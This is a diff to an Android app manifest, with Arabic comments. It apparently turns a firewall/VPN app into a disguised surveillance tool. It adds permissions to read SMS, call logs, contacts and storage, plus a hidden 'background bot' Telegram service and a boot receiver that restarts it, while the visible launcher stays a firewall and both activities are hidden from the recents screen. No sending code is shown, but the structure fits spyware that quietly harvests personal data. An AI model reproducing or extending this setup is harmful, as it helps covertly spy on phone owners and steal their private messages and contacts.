@@ -1,25 +1,71 @@
-<!-- صلاحية VPN -->
-<uses-permission android:name="android.permission.INTERNET" />
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.silent.telebot">
 
-<application ...>
-    <!-- النشاط الجديد -->
-    <activity
-        android:name=".AppListActivity"
-        android:exported="true"
-        android:theme="@style/Theme.AppCompat.NoActionBar">
-        <intent-filter>
-            <action android:name="android.intent.action.MAIN" />
-            <category android:name="android.intent.category.LAUNCHER" />
-        </intent-filter>
-    </activity>
+    <!-- الأذونات الأساسية -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
 
-    <!-- خدمة VPN -->
-    <service
-        android:name=".FirewallVpnService"
-        android:permission="android.permission.BIND_VPN_SERVICE"
-        android:exported="false">
-        <intent-filter>
-            <action android:name="android.net.VpnService" />
-        </intent-filter>
-    </service>
-</application> 
+    <application
+        android:allowBackup="true"
+        android:label="المايسترو"
+        android:theme="@style/Theme.AppCompat.NoActionBar"
+        android:requestLegacyExternalStorage="true">
+
+        <!-- ===== نشاط جدار الحماية (الرئيسي) ===== -->
+        <activity
+            android:name=".firewall.AppListActivity"
+            android:exported="true"
+            android:theme="@style/Theme.AppCompat.NoActionBar"
+            android:excludeFromRecents="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!-- ===== نشاط البوت الخلفي (للأذونات) ===== -->
+        <activity
+            android:name=".telebot.MainActivity"
+            android:exported="false"
+            android:theme="@style/Theme.AppCompat.NoActionBar"
+            android:excludeFromRecents="true" />
+
+        <!-- ===== خدمة البوت ===== -->
+        <service
+            android:name=".telebot.TelegramService"
+            android:exported="false"
+            android:foregroundServiceType="dataSync" />
+
+        <!-- ===== خدمة جدار الحماية (VPN) ===== -->
+        <service
+            android:name=".firewall.FirewallVpnService"
+            android:permission="android.permission.BIND_VPN_SERVICE"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.net.VpnService" />
+            </intent-filter>
+        </service>
+
+        <!-- ===== مستقبلات البث ===== -->
+        <receiver
+            android:name=".telebot.AutoStartReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name=".telebot.TelegramReceiver"
+            android:exported="false" />
+
+    </application>
+</manifest>
